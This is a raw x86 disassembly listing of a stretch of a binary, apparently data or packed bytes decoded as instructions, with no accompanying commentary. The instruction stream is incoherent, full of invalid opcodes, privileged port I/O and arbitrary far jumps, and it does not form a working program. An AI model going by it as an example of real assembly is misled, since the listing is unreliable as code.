  407c06:	ficomp DWORD PTR [edi-0x73]
  407c09:	rcr    DWORD PTR [ebx-0x297f691c],0xb8
  407c10:	sbb    eax,0xfebee3ac
  407c15:	lock (bad) 
  407c17:	jmp    0x309ecf38
  407c1c:	fnstsw WORD PTR [edi]
  407c1e:	and    ch,BYTE PTR [edx]
  407c20:	xchg   edx,eax
  407c21:	xlat   BYTE PTR ds:[ebx]
  407c22:	cmp    ah,0x5e
  407c25:	xor    BYTE PTR [ecx],ch
  407c27:	push   cs
  407c28:	xchg   ebx,eax
  407c29:	jge    0x407c6f
  407c2b:	sbb    BYTE PTR [ecx],dh
  407c2d:	inc    ecx
  407c2e:	(bad)  
  407c2f:	aaa    
  407c30:	and    al,0x50
  407c32:	aad    0x95
  407c34:	push   edi
  407c35:	xlat   BYTE PTR ds:[ebx]
  407c36:	out    0x1,eax
  407c38:	sub    bl,BYTE PTR [eax+ebx*8-0x57]
  407c3c:	ins    BYTE PTR es:[edi],dx
  407c3d:	imul   ebx,DWORD PTR [ebx-0x1e],0x9daec9c9
  407c44:	in     eax,0xf3
  407c46:	jmp    0x8ee8:0x319320a5
  407c4d:	lea    edi,[ecx-0x2e]
  407c50:	dec    ebx
  407c51:	xor    bh,bl
  407c53:	shl    BYTE PTR [edi+0x76],1
  407c56:	pop    ss
  407c57:	jb     0x407c8f
  407c59:	push   esi
  407c5a:	iret   
  407c5b:	dec    edx
  407c5c:	xor    al,BYTE PTR [ebx+0x609ed054]
  407c62:	arpl   dx,cx
  407c64:	jns    0x407c9e
  407c66:	dec    edx
  407c67:	push   ds
  407c68:	test   al,0x22
  407c6a:	xlat   BYTE PTR ds:[ebx]
  407c6b:	inc    esp
  407c6c:	or     BYTE PTR [ecx+eiz*1-0x3c18866d],bl
  407c73:	inc    edx
  407c74:	fstp   QWORD PTR [ecx-0x4663cdc5]
  407c7a:	stos   BYTE PTR es:[edi],al
  407c7b:	mov    ds:0x2b6311c,eax
  407c80:	out    dx,al
  407c81:	addr16 loop 0x407ce3
  407c84:	mov    BYTE PTR [esi+edi*4-0x37],ch
  407c88:	cs es aas 
  407c8b:	sub    dh,BYTE PTR [ebx]
  407c8d:	pop    edx
  407c8e:	mov    eax,ds:0xad4b648d
  407c93:	icebp  
  407c94:	imul   esp,ecx,0x9e720c08
  407c9a:	mov    bl,0x3
  407c9c:	cld    
  407c9d:	lods   al,BYTE PTR ds:[esi]
  407c9e:	sbb    ebp,DWORD PTR [ebp-0x61]
  407ca1:	popa   
  407ca2:	adc    al,al
  407ca4:	mov    ds:0xdfbc48da,eax
  407ca9:	sub    bh,BYTE PTR [ebx-0x53bba591]
  407caf:	pusha  
  407cb0:	das    
  407cb1:	fld    DWORD PTR [ebx+eax*2+0xb]
  407cb5:	outs   dx,BYTE PTR ds:[esi]
  407cb6:	sub    bl,BYTE PTR [edx+0x5c]
  407cb9:	lods   eax,DWORD PTR ds:[esi]
  407cba:	add    dl,BYTE PTR [eax-0x35988426]
  407cc0:	mov    bh,0xca
  407cc2:	fstp   TBYTE PTR [eax]
  407cc4:	or     BYTE PTR [ecx-0x57],dh
  407cc7:	out    0x6a,eax
  407cc9:	push   ecx
  407cca:	mov    ecx,0xb7529480
  407ccf:	pusha  
  407cd0:	shl    DWORD PTR [eax],1
  407cd2:	or     al,0x4e
  407cd4:	sbb    eax,0x8c46752d
  407cd9:	pop    ds
  407cda:	jns    0x407d52
  407cdc:	pop    eax
  407cdd:	faddp  st(6),st
  407cdf:	lahf   
  407ce0:	and    BYTE PTR [eax+0x40],0x2
  407ce4:	outs   dx,BYTE PTR ds:[esi]
  407ce5:	xlat   BYTE PTR ds:[ebx]
  407ce6:	mov    edx,0x21c1a484
  407ceb:	jmp    0x407d54
  407ced:	arpl   WORD PTR [esi-0x384fae19],ax
  407cf3:	add    al,0x95
  407cf5:	xchg   ebx,eax
  407cf6:	mov    esi,0xc1e11ad4
  407cfb:	sahf   
  407cfc:	inc    ebp
  407cfd:	stos   DWORD PTR es:[edi],eax
  407cfe:	push   0xffffffee
  407d00:	in     eax,0xb4
  407d02:	rcl    bl,0xb7
  407d05:	xchg   BYTE PTR [eax],bl
  407d07:	inc    esp
  407d08:	jnp    0x407cac
  407d0a:	shr    DWORD PTR [ebx+0x11],0x9d
  407d0e:	inc    ecx
  407d0f:	fldcw  WORD PTR [ecx+0x232c1f8b]
  407d15:	push   es
  407d16:	push   edx
  407d17:	dec    ecx
  407d18:	jae    0x407d45
  407d1a:	push   edx
  407d1b:	xchg   BYTE PTR [esi+ebx*2-0x6a],bl
  407d1f:	add    eax,0x955dd93e
  407d24:	ret    0x3deb
  407d27:	out    dx,al
  407d28:	push   esp
  407d29:	xor    ebx,esi
  407d2b:	int3   
  407d2c:	repnz loopne 0x407d1d
  407d2f:	adc    eax,0xe5a7d297
  407d34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d35:	jmp    0x21720dc8
  407d3a:	xor    DWORD PTR [edx+0x45d8deef],ecx
  407d40:	in     eax,dx
  407d41:	jle    0x407d36
  407d43:	pop    ebx
  407d44:	retf   0xc404
  407d47:	int    0x37
  407d49:	cld    
  407d4a:	cmp    cl,BYTE PTR [edx]
  407d4c:	fadd   st,st(2)
  407d4e:	popa   
  407d4f:	xor    ecx,esi
  407d51:	sbb    eax,0xe4e4aa47
  407d56:	cmp    al,0xe3
  407d58:	shr    DWORD PTR [eax+0x5c],1
  407d5b:	pop    edi
  407d5c:	sub    esp,DWORD PTR [eax+0x60912e9]
  407d62:	push   0x7429ccb6
  407d67:	sbb    al,0xae
  407d69:	popa   
  407d6a:	fwait
  407d6b:	or     edx,DWORD PTR [edi-0x29216ad4]
  407d71:	jle    0x407d0c
  407d73:	shl    DWORD PTR [eax+0x32],0xca
  407d77:	inc    eax
  407d78:	add    ah,BYTE PTR [ebp-0x5d]
  407d7b:	pop    eax
  407d7c:	or     BYTE PTR [edx],ch
  407d7e:	ds pop ecx
  407d80:	pop    eax
  407d81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d82:	test   DWORD PTR [edi],edi
  407d84:	fcomi  st,st(2)
  407d86:	jb     0x407d7e
  407d88:	mov    esi,0x3bdd857a
  407d8d:	rol    DWORD PTR ds:0x462a0774,1
  407d93:	mov    ecx,DWORD PTR [esi-0x74]
  407d96:	pop    ebx
  407d97:	fisubr DWORD PTR [esi+0x32]
  407d9a:	bound  edi,QWORD PTR ds:0x9fd12710
  407da0:	xchg   esp,eax
  407da1:	xlat   BYTE PTR ds:[ebx]
  407da2:	cli    
  407da3:	aam    0x33
  407da5:	xchg   esp,eax
  407da6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407da7:	aad    0xf9
  407da9:	aaa    
  407daa:	inc    ecx
  407dab:	pop    ecx
  407dac:	or     BYTE PTR [ebx-0x17dada7d],cl
  407db2:	push   DWORD PTR [ecx]
  407db4:	add    BYTE PTR [ebx],dl
  407db6:	repnz inc edx
  407db8:	pop    esp
  407db9:	dec    ebx
  407dba:	push   0xe2fd5800
  407dbf:	cmp    eax,0x2c770a6
  407dc4:	push   0x1f
  407dc6:	repz pop ebx
  407dc8:	jecxz  0x407dc3
  407dca:	mul    DWORD PTR [eax-0x5d]
  407dcd:	adc    dh,BYTE PTR [ebp+ebx*2+0x6a623181]
  407dd4:	and    DWORD PTR [edi+0x1eb44f96],esi
  407dda:	and    eax,ebx
  407ddc:	inc    edi
  407ddd:	out    dx,al
  407dde:	or     al,ch
  407de0:	outs   dx,BYTE PTR ds:[esi]
  407de1:	jmp    0x1daa2a20
  407de6:	or     edx,DWORD PTR [edx]
  407de8:	aas    
  407de9:	stc    
  407dea:	aam    0x90
  407dec:	(bad)  
  407dee:	sub    eax,0xb89940bc
  407df3:	pop    esp
  407df4:	adc    cl,BYTE PTR [ebx+0x45]
  407df7:	jno    0x407e53
  407df9:	imul   ebx,DWORD PTR [ecx],0x32
  407dfc:	or     DWORD PTR [ecx],edx
  407dfe:	jno    0x407e75
  407e00:	ret    0x871
  407e03:	inc    esp
  407e04:	pop    edx
  407e05:	pop    edx
  407e06:	mov    ds:0xb7390c80,eax
  407e0b:	jo     0x407e16
  407e0d:	dec    esp
  407e0e:	popf   
  407e0f:	xor    dh,BYTE PTR [esi+0x42ac1d97]
  407e15:	mov    ds:0xdc2456b9,al
  407e1a:	xor    esi,ecx
  407e1c:	popa   
  407e1d:	loopne 0x407e24
  407e1f:	add    al,0xda
  407e21:	ins    DWORD PTR es:[edi],dx
  407e22:	rol    BYTE PTR [esi],1
  407e24:	sbb    DWORD PTR [ecx+eiz*1-0x7f575d5e],edx
  407e2b:	test   eax,0x8455aa14
  407e30:	push   es
  407e31:	xchg   edi,eax
  407e32:	jmp    0x407e96
  407e34:	push   ss
  407e35:	mov    ebx,0xcc9ceee7
  407e3a:	rol    BYTE PTR [ebx+0x2b3ebbd3],1
  407e40:	add    DWORD PTR [ecx+0x2a],edi
  407e43:	sub    BYTE PTR [eax+ebx*2+0x6c],0x1
  407e48:	mov    eax,?
  407e4a:	push   ds
  407e4b:	push   ds
  407e4c:	inc    ecx
  407e4d:	fimul  WORD PTR ds:[ecx-0x25fa013e]
  407e54:	mov    al,0xdd
  407e56:	stos   BYTE PTR es:[edi],al
  407e57:	mov    ch,0x94
  407e59:	or     eax,0x1c1cba29
  407e5e:	fs mov ebx,0x832a8e65
  407e64:	sub    eax,0x871ea64c
  407e69:	inc    eax
  407e6a:	call   0x567f1efc
  407e6f:	jno    0x407e19
  407e71:	arpl   WORD PTR [edx],cx
  407e73:	mov    dh,0x27
  407e75:	sbb    bh,ch
  407e77:	xchg   ebp,eax
  407e78:	ss inc eax
  407e7a:	fs cmp eax,0x7a7ec6b9
  407e80:	imul   DWORD PTR [edi-0x6a0627c3]
  407e86:	mov    eax,0x2338b49
  407e8b:	cdq    
  407e8c:	dec    ecx
  407e8d:	scas   al,BYTE PTR es:[edi]
  407e8e:	fadd   st,st(4)
  407e90:	je     0x407ea2
  407e92:	sbb    ecx,DWORD PTR [ecx-0xa]
  407e95:	test   al,0x59
  407e97:	jbe    0x407e32
  407e99:	cmp    BYTE PTR [ebx],al
  407e9b:	out    0x1d,al
  407e9d:	fcom   st(3)
  407e9f:	adc    bl,BYTE PTR ds:0x82010d77
  407ea5:	daa    
  407ea6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ea7:	out    dx,al
  407ea8:	sbb    eax,DWORD PTR [eax+0x3cebf273]
  407eae:	inc    esi
  407eaf:	or     ebx,esi
  407eb1:	jo     0x407eca
  407eb3:	pop    esi
  407eb4:	add    ecx,ebp
  407eb6:	adc    al,0x9e
  407eb8:	jl     0x407ebb
  407eba:	xchg   ebp,eax
  407ebb:	mov    ecx,0xde62d1f
  407ec0:	stc    
  407ec1:	mov    edx,0x5a9b00f2
  407ec6:	fdiv   QWORD PTR [ebx+0x38e86527]
  407ecd:	inc    ebx
  407ece:	nop
  407ecf:	jg     0x407f2d
  407ed1:	dec    edx
  407ed2:	mov    BYTE PTR [eax+ebp*8],dh
  407ed5:	xor    esp,0xffffffcf
  407ed8:	leave  
  407ed9:	jg     0x407f0b
  407edb:	call   0x9a30:0x7eee7847
  407ee2:	loope  0x407eef
  407ee4:	mov    ecx,0x336ae46b
  407ee9:	fcomi  st,st(2)
  407eeb:	and    DWORD PTR [edi+eiz*4-0x1dcff247],0xfa29ebda
  407ef6:	pop    ebx
  407ef7:	mov    ch,0xa6
  407ef9:	cwde   
  407efa:	fneni(8087 only) 
  407efc:	loope  0x407ef5
  407efe:	add    BYTE PTR [esi+0x26cc5b58],ch
  407f04:	shl    DWORD PTR [esi+0x66af741a],cl
  407f0a:	sub    eax,0x3277d9cb
  407f0f:	inc    ecx
  407f10:	rcr    DWORD PTR [edx],cl
  407f12:	dec    esp
  407f13:	pushf  
  407f14:	sar    BYTE PTR [edx+0x36],cl
  407f17:	jmp    0x784adef2
  407f1c:	data16 clc 
  407f1e:	scas   al,BYTE PTR es:[edi]
  407f1f:	or     ebx,DWORD PTR [ecx]
  407f21:	imul   eax,DWORD PTR [edx],0xc69d7504
  407f27:	and    bh,BYTE PTR [esi]
  407f29:	lea    esp,[ecx-0x5]
  407f2c:	dec    esi
  407f2d:	jb     0x407ef8
  407f2f:	mov    ch,0x2
  407f31:	adc    DWORD PTR [esi-0x1],esi
  407f34:	xchg   BYTE PTR ds:0x7da9cda9,cl
  407f3a:	xchg   esp,eax
  407f3b:	scas   al,BYTE PTR es:[edi]
  407f3c:	dec    edi
  407f3d:	mov    esp,0xaeb4ee0c
  407f42:	jb     0x407fa7
  407f44:	dec    ebx
  407f45:	inc    esi
  407f46:	loope  0x407edc
  407f48:	lahf   
  407f49:	sub    bh,BYTE PTR [eax-0x10b9b41b]
  407f4f:	add    ebp,DWORD PTR ds:0xf8a7aac4
  407f55:	pop    ebp
  407f56:	stos   BYTE PTR es:[edi],al
  407f57:	outs   dx,DWORD PTR ds:[esi]
  407f58:	aam    0x3f
  407f5a:	and    eax,0x3ec86f64
  407f5f:	out    dx,eax
  407f60:	fisub  WORD PTR [ebx]
  407f62:	sub    cl,ah
  407f64:	add    eax,0x7097a3b6
  407f69:	add    bl,bh
  407f6b:	dec    eax
  407f6c:	in     eax,0x29
  407f6e:	xor    bl,bl
  407f70:	xchg   BYTE PTR [esp+ebx*8-0x3c],bh
  407f74:	pop    edi
  407f75:	loopne 0x407f60
  407f77:	xor    BYTE PTR [ecx+eax*1],dh
  407f7a:	inc    ecx
  407f7b:	cmc    
  407f7c:	mov    esi,0x9c188be8
  407f81:	dec    edx
  407f82:	sbb    BYTE PTR [edx],ch
  407f84:	pop    ss
  407f85:	adc    cl,BYTE PTR [ecx-0x69]
  407f88:	clc    
  407f89:	dec    ebp
  407f8a:	int3   
  407f8b:	mov    esi,0x56a89a4c
  407f90:	mov    edi,DWORD PTR [edx]
  407f92:	inc    ebp
  407f93:	out    0xd3,eax
  407f95:	jnp    0x407f2e
  407f97:	dec    eax
  407f98:	push   edx
  407f99:	lds    eax,FWORD PTR [edx-0x3028b3b]
  407f9f:	pusha  
  407fa0:	jp     0x407f5f
  407fa2:	cdq    
  407fa3:	inc    edx
  407fa4:	lea    edx,[edx]
  407fa6:	add    bh,BYTE PTR [esi-0x1]
  407fa9:	xchg   ebx,eax
  407faa:	inc    ebx
  407fab:	dec    eax
  407fac:	dec    esp
  407fad:	jbe    0x407f7f
  407faf:	out    0x6d,al
  407fb1:	pushf  
  407fb2:	test   BYTE PTR [eax+edi*8],0x2
  407fb6:	xor    DWORD PTR [edx*4+0x50804482],edi
  407fbd:	(bad)  [edi+0xf]
  407fc0:	int3   
  407fc1:	jge    0x407fa1
  407fc3:	cld    
  407fc4:	call   0x3066:0xffa29752
  407fcb:	lds    edx,FWORD PTR [edx-0x354698b8]
  407fd1:	les    edx,FWORD PTR [ecx-0x7e]
  407fd4:	lods   al,BYTE PTR ds:[esi]
  407fd5:	sub    eax,0x82cc4458
  407fda:	xchg   edi,eax
  407fdb:	cmc    
  407fdc:	cmp    ch,bl
  407fde:	xchg   edi,eax
  407fdf:	fnsave [eax]
  407fe1:	addr16 inc edi
  407fe3:	add    DWORD PTR [ebx-0x1a],ecx
  407fe6:	sbb    ecx,edi
  407fe8:	add    bl,ch
  407fea:	popa   
  407feb:	mov    bl,0x56
  407fed:	jmp    0x7051b5e4
  407ff2:	mov    bh,0xdd
  407ff4:	fucomp st(7)
  407ff6:	fwait
  407ff7:	popa   
  407ff8:	jb     0x40806d
  407ffa:	gs jmp 0x407fa7
  407ffd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ffe:	into   
  407fff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408000:	inc    edi
  408001:	aam    0x70
  408003:	in     al,dx
  408004:	add    DWORD PTR [esi-0x57],edx
  408007:	pop    edx
  408008:	add    BYTE PTR [ecx+edi*4],0xd8
  40800c:	push   ss
  40800d:	jbe    0x40808a
  40800f:	mov    DWORD PTR [eax-0x13159862],ebp
  408015:	popa   
  408016:	call   0x55ad:0x542930b7
  40801d:	mov    WORD PTR [eax+edx*8-0x5a],?
  408021:	pop    eax
  408022:	cmp    DWORD PTR [ebx-0xc821453],ecx
  408028:	adc    eax,0x89e9b5b1
  40802d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40802e:	xchg   BYTE PTR [edi],dh
  408030:	xchg   ecx,eax
  408031:	jle    0x40807d
  408033:	and    BYTE PTR [ecx+0x5a251492],cl
  408039:	adc    edx,DWORD PTR [ebx+0x57db3891]
  40803f:	aaa    
  408040:	call   0x142d71d2
  408045:	add    al,0x2a
  408047:	fsubr  QWORD PTR [esi]
  408049:	retf   0x3311
  40804c:	jmp    0x50a0:0x4438fa0d
  408053:	mov    al,ds:0xf21ff713
  408058:	cwde   
  408059:	and    al,0xe
  40805b:	fwait
  40805c:	inc    ecx
  40805d:	cli    
  40805e:	fs js  0x407fea
  408061:	adc    BYTE PTR [esi+0x66e34b60],ch
  408067:	pushf  
  408068:	sub    BYTE PTR [ecx+0x0],dh
  40806b:	jg     0x40803b
  40806d:	or     al,0x29
  40806f:	jae    0x408009
  408071:	fistp  QWORD PTR [ecx-0x4f]
  408074:	fiadd  DWORD PTR [ecx]
  408076:	inc    esi
  408077:	sbb    bh,BYTE PTR [edx-0x1b]
  40807a:	mov    edi,0xefdf8ea3
  40807f:	daa    
  408080:	mov    ch,0x60
  408082:	popf   
  408083:	or     eax,0x6a0404f
  408088:	mov    es,WORD PTR [ebp-0x30c82f50]
  40808e:	bound  edx,QWORD PTR [ecx+0x4fe01c01]
  408094:	std    
  408095:	pop    esp
  408096:	cdq    
  408097:	sub    al,0xf0
  408099:	mov    edx,0x1ceb6468
  40809e:	and    BYTE PTR [edx],cl
  4080a0:	xchg   ebx,eax
  4080a1:	test   BYTE PTR [esi+0x24],0x8e
  4080a5:	(bad)  
  4080a6:	mov    eax,0xfceaa052
  4080ab:	div    dl
  4080ad:	iret   
  4080ae:	ins    DWORD PTR es:[edi],dx
  4080af:	sub    DWORD PTR [ecx],eax
  4080b1:	imul   edx,esp,0x6cbac964
  4080b7:	loope  0x408130
  4080b9:	mov    edx,0xa9007a30
  4080be:	mov    dl,0xc4
  4080c0:	push   0x4e
  4080c2:	loop   0x4080b7
  4080c4:	dec    ecx
  4080c5:	sbb    BYTE PTR ds:0xa40e339c,cl
  4080cb:	push   cs
  4080cc:	adc    cl,BYTE PTR [ecx*4-0x1f23905]
  4080d3:	ds push eax
  4080d5:	jb     0x4080e3
  4080d7:	fwait
  4080d8:	xor    al,0xba
  4080da:	jmp    0x10a574e8
  4080df:	lods   eax,DWORD PTR ds:[esi]
  4080e0:	stos   DWORD PTR es:[edi],eax
  4080e1:	out    dx,al
  4080e2:	xchg   edx,eax
  4080e3:	pop    ecx
  4080e4:	gs stc 
  4080e6:	cwde   
  4080e7:	mov    ah,0x6a
  4080e9:	lods   al,BYTE PTR ds:[esi]
  4080ea:	dec    edx
  4080eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4080ec:	dec    ebp
  4080ed:	ja     0x4080cc
  4080ef:	stos   DWORD PTR es:[edi],eax
  4080f0:	(bad)  
  4080f1:	mov    dl,0x38
  4080f3:	imul   esp,DWORD PTR [edi-0xfdb71d0],0xfffffff0
  4080fa:	call   0xd354:0xc18f6b15
  408101:	rcr    DWORD PTR [ebx+0x16],1
  408104:	xor    DWORD PTR [esi+0x3a],eax
  408107:	bound  esp,QWORD PTR [edx+0x16]
  40810a:	das    
  40810b:	fs aad 0x1d
  40810e:	out    dx,al
  40810f:	in     al,0x92
  408111:	mov    BYTE PTR [edi-0x1747b6b0],al
  408117:	sub    al,0xb7
  408119:	sbb    BYTE PTR [ebx+ebp*1+0x10b08ce0],cl
  408120:	lods   al,BYTE PTR ds:[esi]
  408121:	xlat   BYTE PTR ds:[ebx]
  408122:	and    ebx,DWORD PTR [ecx-0x29]
  408125:	iret   
  408126:	add    edx,DWORD PTR [esi+0x2c]
  408129:	inc    DWORD PTR [ebp-0x4d]
  40812c:	sub    al,0x10
  40812e:	pop    ebx
  40812f:	test   bl,dh
  408131:	scas   eax,DWORD PTR es:[edi]
  408132:	leave  
  408133:	pop    DWORD PTR [edi-0x56]
  408136:	jb     0x4081aa
  408138:	inc    eax
  408139:	or     bl,bh
  40813b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40813c:	adc    bl,BYTE PTR [ebx]
  40813e:	inc    eax
  40813f:	mov    ds:0x72526521,eax
  408144:	mov    BYTE PTR [edi+0x7b],dl
  408147:	jle    0x408186
  408149:	sub    cl,ah
  40814b:	pop    esp
  40814c:	pop    ss
  40814d:	pusha  
  40814e:	xor    DWORD PTR [edx+0x12730bd2],0x5c70f147
  408158:	xchg   edi,eax
  408159:	jge    0x408185
  40815b:	pop    ds
  40815c:	jb     0x408195
  40815e:	fldcw  WORD PTR [ecx-0x47]
  408161:	lea    eax,[eax+0x1f]
  408164:	pushf  
  408165:	pusha  
  408166:	(bad)  
  408167:	add    edi,DWORD PTR ds:0x9edd054e
  40816e:	jbe    0x40818b
  408170:	cli    
  408171:	addr16 (bad) 
  408173:	js     0x408108
  408175:	ret    
  408176:	std    
  408177:	test   BYTE PTR [esi+0x4e],ch
  40817a:	pushf  
  40817b:	retf   0x6eb5
  40817e:	mov    ebp,0x7eaa8802
  408183:	repnz pop esi
  408185:	rol    BYTE PTR es:[eax+0x7887947c],0x2e
  40818d:	das    
  40818e:	inc    edi
  40818f:	fild   WORD PTR [edx]
  408191:	xchg   edi,eax
  408192:	jo     0x40811d
  408194:	rcl    BYTE PTR [ecx-0x55],0xc2
  408198:	jmp    0x3f0c3772
  40819d:	pop    edx
  40819e:	jge    0x408165
  4081a0:	popa   
  4081a1:	mov    ebp,0xabbf54a0
  4081a6:	push   0x58260a4c
  4081ab:	sbb    al,0x63
  4081ad:	add    al,bh
  4081af:	push   0xfffffff1
  4081b1:	xchg   ebp,eax
  4081b2:	inc    eax
  4081b3:	push   0xfffffff3
  4081b5:	jne    0x4081ed
  4081b7:	mov    al,0x40
  4081b9:	jmp    0x40819b
  4081bb:	add    BYTE PTR [eax],0xd
  4081be:	jae    0x4081f1
  4081c0:	(bad)  
  4081c1:	push   ebp
  4081c2:	add    BYTE PTR [ebx],al
  4081c4:	mov    dh,ch
  4081c6:	popa   
  4081c7:	sahf   
  4081c8:	fbld   TBYTE PTR [edx]
  4081ca:	jl     0x408203
  4081cc:	inc    eax
  4081cd:	test   eax,0x34ef69c2
  4081d2:	fcomp  QWORD PTR [edx-0x76]
  4081d5:	add    DWORD PTR [eax],ecx
  4081d7:	aam    0x79
  4081d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4081da:	jg     0x408182
  4081dc:	sbb    al,0xd4
  4081de:	retf   
  4081df:	push   edi
  4081e0:	scas   eax,DWORD PTR es:[edi]
  4081e1:	shr    DWORD PTR [ebx],1
  4081e3:	xor    al,0x5f
  4081e5:	mov    ebp,DWORD PTR [eax+ebx*4+0x277b6d18]
  4081ec:	jno    0x7dca52a4
  4081f2:	push   eax
  4081f3:	shr    DWORD PTR [ebp-0x40],0x79
  4081f7:	add    eax,0x8c26d272
  4081fc:	push   ebp
  4081fd:	ins    BYTE PTR es:[edi],dx
  4081fe:	adc    al,0x5a
  408200:	movups XMMWORD PTR [ecx-0x12],xmm6
  408204:	mov    bl,0x30
  408206:	int3   
  408207:	adc    BYTE PTR [edx+0x5c],0x7a
  40820b:	jmp    0x5cebf20c
  408210:	mov    ah,BYTE PTR [edi-0x59]
  408213:	fistp  QWORD PTR [ebp+edx*8+0x2b]
  408217:	sub    BYTE PTR [eax+edi*1+0x56c00906],bh
  40821e:	inc    esi
  40821f:	outs   dx,DWORD PTR ds:[esi]
  408220:	xchg   esp,eax
  408221:	popf   
  408222:	ret    0xd9c6
  408225:	and    bh,dh
  408227:	sub    DWORD PTR [edi+ebp*8],eax
  40822a:	sbb    ecx,eax
  40822c:	pop    esi
  40822d:	aad    0xe5
  40822f:	and    ecx,DWORD PTR [eax-0x64]
  408232:	cdq    
  408233:	sub    dl,cl
  408235:	jno    0x408206
  408237:	xor    al,0x68
  408239:	pop    ebx
  40823a:	retf   0x2133
  40823d:	and    edx,esp
  40823f:	std    
  408240:	jae    0x40828a
  408242:	and    eax,0x3be4b57e
  408247:	push   0xffffffd3
  408249:	adc    eax,0x4e47e93e
  40824e:	pop    esi
  40824f:	and    al,0x65
  408251:	lock add eax,0x406aed73
  408257:	clc    
  408258:	or     DWORD PTR [ecx-0x39],ebx
  40825b:	in     eax,0x53
  40825d:	lea    ebx,[ecx+0x4fac5e6e]
  408263:	add    bh,BYTE PTR ds:0xf6df52d9
  408269:	scas   eax,DWORD PTR es:[edi]
  40826a:	stc    
  40826b:	(bad)
  40826e:	enter  0x49b8,0x2
  408272:	or     eax,0xc634dbf4
  408277:	std    
  408278:	sub    ch,ch
  40827a:	gs push 0xe1f90867
  408280:	sub    edx,DWORD PTR [esi]
  408282:	push   cs
  408283:	loope  0x4082a1
  408285:	lahf   
  408286:	fcom   QWORD PTR [esi-0x2c015dbb]
  40828c:	aaa    
  40828d:	add    ecx,DWORD PTR [eax+0xb2a9e81]
  408293:	cmp    eax,0x24c9cc94
  408298:	test   BYTE PTR [eax-0x29],cl
  40829b:	push   ecx
  40829c:	cmp    eax,0x5cb2efc8
  4082a1:	loope  0x40828e
  4082a3:	sbb    ecx,DWORD PTR es:[ebx+0x57c1d734]
  4082aa:	pop    es
  4082ab:	lds    esi,FWORD PTR [edx]
  4082ad:	ins    DWORD PTR es:[edi],dx
  4082ae:	aaa    
  4082af:	push   ecx
  4082b0:	in     eax,0x8e
  4082b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082b3:	cdq    
  4082b4:	ins    BYTE PTR es:[edi],dx
  4082b5:	jge    0x4082ac
  4082b7:	das    
  4082b8:	ds mov cl,0xfd
  4082bb:	int3   
  4082bc:	jmp    0x4082e8
  4082be:	or     esp,DWORD PTR [eax+esi*8+0x9123cdf]
  4082c5:	jnp    0x408278
  4082c7:	aas    
  4082c8:	mov    dl,0x76
  4082ca:	mov    bl,0x18
  4082cc:	mov    edi,0x1c9a580a
  4082d1:	cwde   
  4082d2:	mov    edi,esp
  4082d4:	les    ecx,FWORD PTR ds:0x69766a2f
  4082da:	daa    
  4082db:	cdq    
  4082dc:	das    
  4082dd:	jo     0x4082d5
  4082df:	and    dh,BYTE PTR [ecx+esi*2]
  4082e2:	mov    ah,0x6d
  4082e4:	adc    eax,0x9eece95b
  4082e9:	call   0x7fc4023d
  4082ee:	cmp    DWORD PTR [edi+0x6d],eax
  4082f1:	sbb    al,0xcf
  4082f3:	hlt    
  4082f4:	cmp    eax,DWORD PTR [eax+0x8]
  4082f7:	add    edx,DWORD PTR [esi]
  4082f9:	test   BYTE PTR [edx],bh
  4082fb:	inc    edx
  4082fc:	sub    dh,ah
  4082fe:	mov    fs,WORD PTR [edi+0x45cdd910]
  408304:	lahf   
  408305:	sbb    BYTE PTR [esi+0x4e],cl
  408308:	sub    al,BYTE PTR [ebx]
  40830a:	xchg   ecx,eax
  40830b:	in     al,dx
  40830c:	loopne 0x408387
  40830e:	cmc    
  40830f:	jnp    0x40830d
  408311:	and    al,0x8a
  408313:	fwait
  408314:	jge    0x408378
  408316:	data16 xor BYTE PTR [ecx+eax*1],dh
  40831a:	push   ebp
  40831b:	scas   eax,DWORD PTR es:[edi]
  40831c:	push   0x23b45657
  408321:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408322:	jne    0x4082be
  408324:	and    dl,dh
  408326:	std    
  408327:	(bad)  
  408329:	dec    ecx
  40832a:	in     al,dx
  40832b:	mov    ds:0x8babe38b,eax
  408330:	sbb    DWORD PTR [ebx+ecx*2],0x36
  408334:	dec    ebx
  408335:	adc    DWORD PTR [eax+eiz*2+0x304703ac],ebp
  40833c:	das    
  40833d:	pop    edx
  40833e:	jl     0x40836b
  408340:	outs   dx,DWORD PTR ds:[esi]
  408341:	mov    esi,0x4d3650f3
  408346:	jmp    0xf72a:0x7a638b9
  40834d:	int    0x8c
  40834f:	jb     0x408386
  408351:	retf   0x2de0
  408354:	adc    bh,al
  408356:	test   BYTE PTR [edi-0x4f],ch
  408359:	xor    DWORD PTR [ebp+0x25],0x39
  40835d:	cwde   
  40835e:	mov    ch,dh
  408360:	dec    esp
  408361:	aam    0x43
  408363:	scas   eax,DWORD PTR es:[edi]
  408364:	or     al,0x4b
  408366:	sahf   
  408367:	mov    al,ds:0xfb2381b3
  40836c:	adc    DWORD PTR [esi-0x2e0df5c1],0xbdfea03c
  408376:	jmp    0x408384
  408378:	fsub   DWORD PTR [ebx]
  40837a:	inc    ecx
  40837b:	jbe    0x4083ae
  40837d:	dec    eax
  40837e:	stos   DWORD PTR es:[edi],eax
  40837f:	or     eax,0xf2a4e550
  408384:	fwait
  408385:	pop    ebp
  408386:	test   al,0x46
  408388:	mov    BYTE PTR [eax+0x32],cl
  40838b:	jmp    0xdbab:0xd7596560
  408392:	push   eax
  408393:	adc    eax,DWORD PTR [edi+eax*4-0x73]
  408397:	sti    
  408398:	ret    0x48af
  40839b:	xchg   esp,eax
  40839c:	fsub   QWORD PTR [esi]
  40839e:	push   ds
  40839f:	cmp    BYTE PTR [edx+0x140b19ac],bl
  4083a5:	sub    eax,0x5dd945dc
  4083aa:	leave  
  4083ab:	shl    BYTE PTR [ebp+0x436f0334],1
  4083b1:	or     DWORD PTR [esi-0x6620d260],0xffffffb7
  4083b8:	les    esp,FWORD PTR [edx-0x67]
  4083bb:	sub    eax,0x49d56cd4
